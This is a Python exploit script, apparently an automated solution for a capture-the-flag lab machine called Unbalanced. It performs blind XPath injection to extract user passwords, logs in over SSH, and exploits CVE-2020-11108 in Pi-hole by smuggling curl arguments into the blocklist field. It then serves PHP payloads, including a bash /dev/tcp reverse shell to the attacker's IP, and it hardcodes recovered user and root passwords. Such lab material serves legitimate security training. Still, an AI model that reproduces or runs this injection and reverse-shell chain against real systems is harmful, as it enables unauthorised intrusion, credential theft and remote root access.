#!/bin/python3
import requests
import string
import coloredlogs
import logging
from colorama import Fore
import argparse
from pwn import *
import time
import paramiko
from sshtunnel import SSHTunnelForwarder
from bs4 import BeautifulSoup
import _thread

logger = logging.getLogger(__name__)
coloredlogs.install(level='INFO', fmt='%(asctime)s-%(hostname)s-%(message)s', logger=logger)

#users = ['bryan']
users = ['rita','sarah','jim','bryan']
proxy = {"http":"http://10.10.10.200:3128"} #without proxy
#proxy = {"http":"http://127.0.0.1:8888"} # burp proxy
#proxyValues = {'http':'http://127.0.0.1:8888'} #for debugging
host  = "10.10.10.200"
url = "http://172.31.179.1/intranet.php"
printableChars = string.printable


def get_args():
	parser =argparse.ArgumentParser(description="Dumpster Autopwn for Unbalanced", usage="python <script>.py -i <ip> -p <port> -t <user|root>", epilog="",   formatter_class=argparse.RawTextHelpFormatter)
	parser.add_argument('-i','--ip',type=str, help="Attacker IP", required=True)
	parser.add_argument('-p','--port',type=str, help="Attacker Port will use attacker_port and attacker_port+1 e.g. 4445 will use 4445 and 4446",required=True)
	parser.add_argument('-t','--target', type=str,choices=['user','root'], required=True, help="user: Post rsync stages \r\nroot: root step"   )
	parser.add_argument('-f','--forwardport', type=int, required=True, help="For root, we need to portforward")

	args = parser.parse_args()
	attacker_ip = args.ip
	attacker_port = args.port
	target = args.target
	forwardport = args.forwardport

	return attacker_ip,attacker_port,target,forwardport

#In order to execute our XPath Injection, this finds out the length of the password field for a specific user
def xPathDetermineLength(username):
	daLength = 1 
	while (daLength < 100):

		payload = "%s' and string-length(Password/text())>%i or 'a'='a" % (username, daLength)
		data = {"Username":payload, "Password":"blah"}
		r = requests.post(url,proxies=proxy,data=data)
		if username in r.text:
			daLength+=1
		else:
			break
	return daLength

#We iterate through substring from 0..PasswordLength to find each character of the password 1 by 1 in the space of printable characters
def xPathFindPassword(username,userPasswordlength):
	length = 1
	password = ""

	while (length < userPasswordLength+1):
		for p in printableChars:
			payload = "%s' and substring(Password/text(),%i,1)='%s' or 'a'='a" % (user,length,p)
			data = {"Username":payload, "Password": "blah"}
			r = requests.post(url, proxies=proxy,data=data)
			if user in r.text:
				length +=1
				password += p
				#sys.stdout.flush()
				print (Fore.YELLOW + password, end='\r')
				#print (Fore.YELLOW + password, end='\r', flush=True)
				break
			else:
				continue
	#print ('', flush=True)
	logger.info("We found the password! It is: " + Fore.GREEN + "%s" % password) 
	sys.stdout = sys.__stdout__ #reset stdout 
	return password

#used for our randomly generated php file names
def randomString(stringLength=5):
	letters =string.ascii_lowercase
	return ''.join(random.choice(letters) for i in range(stringLength))

#Retrieves PHPSessID from logging into pi-hole
def LoginPiHole(port):
	url = "http://127.0.0.1:" + str(port) + "/admin/index.php?login"
	payload = {'pw':'admin'}
	session = requests.session()
	logger.info("Logging into: %s with payload: %s" % (url,payload))
	resp = session.post(url, data=payload, allow_redirects=False) # we dont want to follow 302, need to retreive PHPSESSID
	logger.info("Retrieved session cookies: %s" % resp.cookies)
	return resp.cookies 

#Retrieve CSRF token used for pi-hole
def retrieveToken(sessionCookie, port):
	url = "http://127.0.0.1:" + str(port) + "/admin/settings.php?tab=blocklists"

	logger.info("Retrieving token from url: %s" % url)
	resp = requests.get(url,cookies=sessionCookie)
	soup = BeautifulSoup(resp.text,'html.parser')
	token = soup.find("div", {"id":"token"})
	logger.info("Token value is: %s" % token.text)
	return token.text

#sends add url in blacklists for pi-hole
def sendPayload_addURL(sessionCookie,port, token,filename):
	url = "http://127.0.0.1:" + str(port) + "/admin/settings.php?tab=blocklists"
	logger.info("Updating blocklist: %s" % url)
	
	payload = "http://"+attacker_ip+"#\" -o " + filename +" -d \""
	data =  {"newuserlists":payload,"field":"adlists","token":token,"submit":"saveupdate"}
	resp = requests.post(url, cookies=sessionCookie, data=data)
	if resp.status_code == 200:
		logger.info("Successfully sent payload: %s" % payload)
	else:
		logger.error("Something went wrong!")

#trigger callbacks with update gravity
def updateGravity(sessionCookie,port):
	url = "http://127.0.0.1:" + str(port) + "/admin/scripts/pi-hole/php/gravity.sh.php"
	logger.info("Invoking callback: %s" % url)
	resp = requests.get(url, cookies=sessionCookie)

#invokes a reverse shell payload
def invokeReverseShell(sessionCookie,port,filename):
	url = "http://127.0.0.1:" + str(port) + "/admin/scripts/pi-hole/php/" + filename
	logger.info("Invoking Reverse Shell: %s" % url)
	try:
		requests.get(url, cookies=sessionCookie, timeout=2)
	except:
		None

#payload server acting as a HTTP server
def payloadServer(threadName,attacker_ip, payload):
	l1 = listen(80)
	
	if l1.connected():
		if threadName == "PHASE1":
			logger.info("PHASE1: Sending First callback")
			#print (l1.recv())
			l1.sendline(payload)
		elif threadName == "PHASE2":
			logger.info("PHASE2: Sending php reverse shell payload: %s" % payload )
			#print (l1.recv())
			l1.sendline(bytes(payload, "utf-8"))	
		elif threadName == "PHASE3":
			logger.info("PHASE3: Sending Second callback")
			l1.sendline(payload)
		elif threadName == "PHASE4":
			logger.info("PHASE4: Sending php reverse shell payload: %s" % payload )
			l1.sendline(bytes(payload, "utf-8"))
		
		l1.close()

''' 
#poc code
def payloadServer(threadName,attacker_ip, payload):
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.bind((attacker_ip,int(80)))
	sock.listen(5)
	connected = False
	while not connected:
		conn,addr = sock.accept()
		if threadName == "PHASE1":
			logger.info("PHASE1: Sending First")
			conn.sendall(payload)
		elif threadName == "PHASE2":
			logger.info("PHASE2: Sending php reverse shell payload: %s" % payload )
			print("[+] Uploading Payload")
			conn.sendall(bytes(payload, "utf-8"))
		elif threadName =="PHASE3"
		conn.close()
		connected = True
	sock.close()
'''

if __name__ == "__main__":
	sys.stdout = sys.__stdout__ #reset stdout 
	attacker_ip, attacker_port, target, forwardport = get_args()
	
	#will perform XPath Injection to disclose usernames
	if target  == "user":
		credDict = {}
		logger.info("Exploiting XPath Injection on %s to discover creds" % url) 
		
		for user in users:
			logger.info("Trying to find password length user: %s" % user)
			userPasswordLength = xPathDetermineLength(user)
			logger.info("Password length for %s is: %i" % (user,userPasswordLength )	)
			logger.info("Trying to find password for user: %s" % user)
			
			
			password = xPathFindPassword(user, userPasswordLength)
			credDict[user] = password
		
		for user in credDict:
			logger.info("Trying creds for user: %s" %user)
			try:

				s1 = ssh(host=host, user=user, password=credDict[user])
				logger.info(Fore.GREEN + "User: %s with Password: %s works over SSH" % (user,credDict[user]))
				logger.info("Launching interactive shell! Have fun!")
				shell = s1.shell()
				shell.sendline("cat user.txt")					
				shell.interactive()

			except:
				logger.info(Fore.RED + "User: %s with Password: %s does not work over SSH" % (user,credDict[user]))

	#exploits cve-2020-11108 	
	elif target  == "root":
		#from user we find that bryan's creds work - so lets log in
		username = "bryan"
		password = "ireallyl0vebubblegum!!!"

		with SSHTunnelForwarder( 
			('10.10.10.200',22),
			ssh_username=username,
			ssh_password=password,
			remote_bind_address=('127.0.0.1',8080),
			local_bind_address=('127.0.0.1',forwardport)
		) as SSHserver:

			logger.info("Equivalent of ssh -L %s:localhost:8080 bryan@10.10.10.200 forwarding completed" % (SSHserver.local_bind_port) )
			sessionCookie = LoginPiHole(forwardport)
			token = retrieveToken(sessionCookie, forwardport)
			
			phpFilename = randomString() + ".php"
			sendPayload_addURL(sessionCookie,forwardport,token,phpFilename)
			payload1 = b"HTTP/1.1 200 OK\n\nstuff\n"

			_thread.start_new_thread(payloadServer,("PHASE1",attacker_ip,payload1,)) #we have to thread this 
			updateGravity(sessionCookie,forwardport)				
			time.sleep(2)
			
			#payload2 = """<?php $sock=fsockopen("%s",%s);exec("/bin/sh -i <&3 >&3 2>&3"); ?>"""% (attacker_ip,attacker_port)
			#payload2 = """<?php exec("/bin/bash -c 'bash -i > /dev/tcp/%s/%s 0>&1'");?>"""	% (attacker_ip,attacker_port)

			payload2 = """<?php shell_exec("sudo pihole -a -t");?>"""	
			_thread.start_new_thread(payloadServer,("PHASE2",attacker_ip,payload2,)) #we have to thread this 
			updateGravity(sessionCookie,forwardport)		
	
			rootphpFilename =  "teleporter.php"
			sendPayload_addURL(sessionCookie,forwardport,token,rootphpFilename)
			payload3 = b"HTTP/1.1 200 OK\n\nstuff\n"

			_thread.start_new_thread(payloadServer,("PHASE3",attacker_ip,payload3,)) #we have to thread this 
			updateGravity(sessionCookie,forwardport)

			
			l2 = listen(attacker_port) #set up the listener
			time.sleep(2)
			
			payload4 = """<?php exec("/bin/bash -c 'bash -i > /dev/tcp/%s/%s 0>&1'");?>"""% (attacker_ip,attacker_port)
			_thread.start_new_thread(payloadServer,("PHASE4",attacker_ip,payload4,)) #we have to thread this 
			updateGravity(sessionCookie,forwardport)
			
			#invoke the random php file to get root
			invokeReverseShell(sessionCookie,forwardport,phpFilename)
			svr = l2.wait_for_connection()
			logger.info(Fore.GREEN+ "Launching interactive root shell in the container! Have fun! (check the pi-hole configs)." + Fore.RESET + " Press CTRL-C to resume rest of root")			
			svr.interactive()

			logger.info("Now that we have creds in the config, let's try it to get to root")

			s1 = ssh(host=host, user=username, password=password)
			logger.info(Fore.GREEN + "Logging in ssh as: %s with Password: %s over SSH" % (username,password))
			
			shell = s1.shell()
			shell.sendline("su")
			shell.recvline()
			time.sleep(2)
			shell.sendline("bUbBl3gUm$43v3Ry0n3!")
			time.sleep(1)
			shell.sendline("ls -l /root")		
			shell.sendline("cat /root/root.txt")
			logger.info("Launching " + Fore.GREEN + "ROOT" + Fore.RESET + " interactive shell! Have fun!")
			shell.interactive()